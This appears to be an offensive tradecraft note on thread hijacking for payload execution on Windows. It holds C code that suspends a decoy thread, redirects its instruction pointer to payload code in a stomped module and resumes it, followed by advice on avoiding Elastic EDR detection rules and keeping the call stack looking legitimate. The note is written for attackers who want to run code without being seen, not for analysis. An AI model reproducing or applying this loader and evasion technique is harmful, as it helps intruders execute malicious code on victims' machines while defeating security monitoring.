# Thread Hijacking (local process)

## Goal
Run payload code on an *existing* thread instead of creating a new one for execution. The thread's start address stays inside a legit module while we redirect RIP mid-flight.

## Pattern (self-process variant — no remote handles needed)
```c
// 1. Create a suspended worker thread — its start routine is a benign stub
//    inside our own image or a legit module
HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)decoy_stub,
                        NULL, CREATE_SUSPENDED, NULL);

// 2. Redirect its instruction pointer to the payload
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(t, &ctx);
ctx.Rip = (DWORD64)execAddr;   // e.g. address inside a stomped module
SetThreadContext(t, &ctx);

// 3. Resume — the thread "wakes up" already inside payload code
ResumeThread(t);
```

## Detection surface (Elastic)
- `SetThreadContext`/`GetThreadContext` on a suspended thread is a classic injection indicator — rules matching `process.Ext.api.name : "SetThreadContext"` may fire. Mitigate by calling it from inside a stomped module (call-stack hygiene) so the caller frame resolves to a legit DLL.
- Weaker than fiber execution on telemetry (Suspend/Get/SetContext leaves a visible API chain), but stronger than a plain `CreateThread(execAddr)` — the thread start address itself is never the payload.
- Prefer CREATE_SUSPENDED `CreateThread` over hijacking a busy existing thread: mid-flight context flips on a running thread race and crash.

## Pitfalls
- After payload returns, the thread has no sane return path — point it back at the decoy or terminate cleanly (`ExitThread` shim / stack pivot is fragile in pure C; document limitation).
- Keep the decoy stub inside our own `.text` or a stomped region — a decoy address in private memory defeats the purpose.
